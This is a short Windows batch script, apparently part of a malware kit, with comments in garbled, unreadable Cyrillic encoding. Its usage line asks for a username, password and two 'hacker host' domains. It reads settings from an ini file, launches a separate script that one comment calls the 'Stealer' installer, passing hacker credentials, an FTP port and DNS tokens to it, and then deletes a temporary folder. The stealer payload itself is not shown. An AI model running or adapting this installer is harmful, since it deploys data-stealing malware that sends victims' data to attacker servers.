rem ���� ��⠭���� �⠩��� (��������᪨� ��ਠ��)
rem USAGE
rem > install.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem ����᪠�� 䠩� � �ࠢ��� �����������

rem ���樠�����㥬 ��६���� ���㦥��� �ਯ�

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem ᮧ��� ��⥬�� ��६���� Windows ��� ��⭥�
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host2=%3
rem set Hacker_host3=%4

rem ������塞 ��६ᥭ�� ���㦥���
call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"

rem ��⠥� ����ன�� �� 䠩�� settings.txt, ����� ������ �ᯮ�������� �
rem ⮬ �� ��⠫���, �� � bat-䠩�. �᫨ �� 㤠���� �ᯠ���� ����ன�� -
rem ��室�� � ���㫥�� ����� ������.
call :read_settings %~dp0\install_Styler.ini || exit /b 1

rem Go to Temprorary Directory
cd /d %curdir%

rem ����᪠�� ���⠫���� Stealer "��ᯮ����"
call %LocalFolderZ%\install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
cd /d %curdir%

rem ����塞 �६���� ��⠫��
rd /S /Q WindowsPowerShell

rem ��室 �� �業���. ����� - ⮫쪮 �㭪樨.
exit /b 0

rem
rem �㭪�� ��� �⥭�� ����஥� �� 䠩��.
rem �室:
rem       %1           - ��� 䠩�� � ����ன����
:read_settings

set SETTINGSFILE=%1

rem �஢�ઠ ����⢮����� 䠩��
if not exist %SETTINGSFILE% (
    echo FAIL: ���� � ����ன���� ���������
    exit /b 1
)

rem ��ࠡ�⪠ 䠩�� c ����ன����
rem �����:
rem     eol=# 㪠�뢠�� �� �, �� ᮤ�ন��� ��ப� ��稭�� � ᨬ���� #
rem     � �� �� ���� ����� ���� �ய�饭� ��� �������਩.
rem
rem     delims== 㪠�뢠��, �� ࠧ����⥫�� ���祭�� ���� ᨬ��� =
rem
rem     tokens=1,2 �ਢ���� � ⮬�, �� � ��६����� %%i �㤥� ����ᥭ ����
rem     ⮪��, � � %%j - ��ன.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem � ��६����� i - ����
    rem � ��६����� j - ���祭��
    rem �� �࠭᫨�㥬 �� � ��६���� ���㦥���
    set %%i=%%j
)
exit /b 0

